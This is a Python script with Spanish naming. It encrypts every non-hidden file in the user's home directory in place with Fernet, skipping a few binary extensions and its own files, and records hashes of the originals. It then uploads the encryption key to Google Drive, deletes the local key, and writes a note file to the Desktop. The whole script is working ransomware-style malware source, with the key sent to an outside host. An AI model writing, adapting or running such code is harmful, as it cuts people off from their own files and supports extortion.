# proceso completo

import os
import json
import hashlib
from cryptography.fernet import Fernet
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload

# ========================
# CONFIG GOOGLE DRIVE
# ========================
SCOPES = ['https://www.googleapis.com/auth/drive.file']

EXTENSIONES_PROHIBIDAS = ['.so', '.exe', '.dll', '.img', '.iso']
ARCHIVOS_EXCLUIDOS = ['key.key', 'encripta.py', 'desencripta.py', 'hashes.json']


# === Funciones para encriptar archivos ===
def generar_key(path="key.key"):
    key = Fernet.generate_key()
    with open(path, "wb") as f:
        f.write(key)
    return key

def calcular_hash(data):
    return hashlib.sha256(data).hexdigest()

def es_oculto(path):
    return any(p.startswith('.') for p in path.split(os.sep))

def encontrar_archivos(ruta_home, key_path, script_path):
    archivos = []
    for dirpath, _, filenames in os.walk(ruta_home):
        if es_oculto(dirpath):
            continue
        for nombre in filenames:
            full_path = os.path.join(dirpath, nombre)
            _, ext = os.path.splitext(nombre)
            if (
                ext.lower() in EXTENSIONES_PROHIBIDAS or
                full_path == key_path or
                full_path == script_path or
                nombre in ARCHIVOS_EXCLUIDOS
            ):
                continue
            archivos.append(full_path)
    return archivos

def encriptar_archivos(archivos, key):
    f = Fernet(key)
    hashes = {}
    for archivo in archivos:
        try:
            with open(archivo, "rb") as file:
                datos = file.read()
            hash_original = calcular_hash(datos)
            datos_encriptados = f.encrypt(datos)
            with open(archivo, "wb") as file:
                file.write(datos_encriptados)
            hashes[archivo] = hash_original
            print(f"✔ Encriptado: {archivo}")
        except Exception as e:
            print(f"✘ Error con {archivo}: {e}")
    return hashes

# === Google Drive ===
def autenticar():
    creds = None
    if os.path.exists('token.json'):
        creds = Credentials.from_authorized_user_file('token.json', SCOPES)
    if not creds or not creds.valid:
        flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
        creds = flow.run_local_server(port=0)
        with open('token.json', 'w') as token:
            token.write(creds.to_json())
    return creds

def subir_archivo(nombre_local, nombre_en_drive):
    creds = autenticar()
    service = build('drive', 'v3', credentials=creds)
    file_metadata = {'name': nombre_en_drive}
    media = MediaFileUpload(nombre_local, resumable=True)
    file = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
    print(f"[📤] Subido a Drive: {nombre_en_drive} (ID: {file['id']})")
    return file['id']

if __name__ == "__main__":
    ruta_home = os.path.expanduser("~")
    key_path = os.path.realpath("key.key")
    script_path = os.path.realpath(__file__)

    if not os.path.exists("key.key"):
        key = generar_key()
    else:
        with open("key.key", "rb") as f:
            key = f.read()

    archivos = encontrar_archivos(ruta_home, key_path, script_path)
    hashes = encriptar_archivos(archivos, key)

    with open("hashes.json", "w") as f:
        json.dump(hashes, f)

    # Subir clave a Google Drive y borrar local
    subir_archivo("key.key", "key.key")
    os.remove("key.key")

    # Crear saludo.txt en escritorio
    escritorio = os.path.join(ruta_home, "Desktop")
    with open(os.path.join(escritorio, "saludo.txt"), "w") as f:
        f.write("hola como estas?")

    print("\n[🔒] Encriptación y subida completadas con éxito.")
